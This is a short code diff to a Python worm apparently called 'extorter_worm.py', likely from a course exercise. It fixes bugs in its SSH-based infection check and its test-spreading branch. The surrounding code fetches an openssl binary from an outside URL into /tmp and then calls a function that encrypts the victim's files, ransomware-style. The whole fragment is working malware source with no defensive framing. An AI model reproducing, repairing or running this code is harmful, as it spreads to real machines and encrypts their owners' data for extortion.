@@ -57,7 +57,7 @@ def isTargetInfected(ssh):
 		sftpClient = ssh.open_sftp()
 		     
 		# Check if the file exists
-		sftpClient.stat(infectionMarker)
+		sftpClient.stat(markerLocation)
 	 
 		# The system is already infected
 		infected = True
@@ -147,9 +147,9 @@ if len(sys.argv) >= 2:
 		print("This is the host computer will not encrypt this Documents folder!")
 		wormLocation = "extorter_worm.py"
 	elif sys.argv[1] == "-t":
-		print("Testing spreading with this IP: %s" %(str(argv[2])))
+		print("Testing spreading with this IP: %s" %(str(sys.argv[2])))
 		wormLocation = "extorter_worm.py"
-		network = [argv[2]]
+		network = [sys.argv[2]]
 else:
 	urllib.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl", "/tmp/openssl")
 	encryptVictim()
